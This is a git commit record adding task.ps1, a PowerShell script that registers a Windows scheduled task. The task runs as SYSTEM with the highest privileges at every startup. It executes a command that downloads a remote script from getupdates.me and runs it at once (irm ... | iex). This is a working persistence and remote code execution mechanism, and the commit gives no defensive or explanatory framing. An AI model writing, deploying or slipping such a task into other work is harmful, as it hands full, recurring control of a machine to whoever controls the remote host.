cb999b8bb4caf35e105f255a1c268cc049416afd
kennethchow1 <103966331+kennethchow1@users.noreply.github.com>
2024-07-19 14:38:39 -0700

    Create task.ps1

---
+++ task.ps1
@@ -0,0 +1,11 @@
+## Create the action
+$action = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument '-Command "irm https://getupdates.me/test3.ps1 | iex"'
+
+## Set to run as local system, No need to store Credentials!!!
+$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
+## set to run at startup could also do -AtLogOn for the trigger
+$trigger = New-ScheduledTaskTrigger -AtStartup
+
+## register it (save it) and it will show up in default folder of task scheduler.
+Register-ScheduledTask -Action $action -TaskName 'mytask' -TaskPath '\' -Principal $principal -Trigger $trigger
